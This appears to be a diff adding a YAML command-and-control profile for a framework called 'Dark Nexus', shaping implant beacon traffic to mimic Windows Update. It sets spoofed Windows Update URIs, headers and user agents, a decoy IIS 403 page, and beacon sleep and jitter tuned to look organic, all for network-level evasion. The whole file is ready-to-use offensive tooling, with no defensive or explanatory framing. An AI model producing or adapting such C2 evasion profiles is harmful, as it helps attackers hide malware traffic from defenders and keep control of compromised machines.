@@ -1,0 +1,62 @@
+# Dark Nexus C2 Profile: Microsoft Update
+# Mimics Windows Update traffic patterns for network-level evasion
+# Blends with legitimate Microsoft update checks
+
+name: "microsoft-update"
+description: "Traffic shaped to resemble Windows Update HTTPS calls"
+
+# HTTP Configuration
+http:
+  checkin:
+    uri: "/v9/windowsupdate/redir/muv4wuredir.cab"
+    method: "POST"
+    headers:
+      Content-Type: "application/octet-stream"
+      Accept: "*/*"
+      Connection: "Keep-Alive"
+      Cache-Control: "no-cache"
+      Pragma: "no-cache"
+      X-WU-Client: "WindowsUpdate/10.0"
+
+  result:
+    uri: "/v9/windowsupdate/redir/wuredir.cab"
+    method: "POST"
+    headers:
+      Content-Type: "application/octet-stream"
+      Accept: "*/*"
+      Connection: "Keep-Alive"
+      X-WU-Client: "WindowsUpdate/10.0"
+
+  default_page:
+    status: 403
+    headers:
+      Server: "Microsoft-IIS/10.0"
+      X-Powered-By: "ASP.NET"
+      Content-Type: "text/html"
+    body: |
+      <!DOCTYPE html>
+      <html>
+      <head><title>403 - Forbidden</title></head>
+      <body>
+      <h1>Server Error</h1>
+      <h2>403 - Forbidden: Access is denied.</h2>
+      <p>You do not have permission to view this directory or page using the credentials that you supplied.</p>
+      </body>
+      </html>
+
+# User-Agent pool (Windows Update clients)
+user_agents:
+  - "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.33"
+  - "Windows-Update-Agent/10.0.19041.1 Client-Protocol/2.0"
+  - "Microsoft-Delivery-Optimization/10.0"
+
+# Beacon timing (slower, mimics real update checks)
+beacon:
+  sleep: 30         # 30 seconds, update checks are periodic
+  jitter: 40        # high jitter to look organic
+  max_retries: 5
+  kill_date: ""
+
+tls:
+  cert: ""
+  key: ""
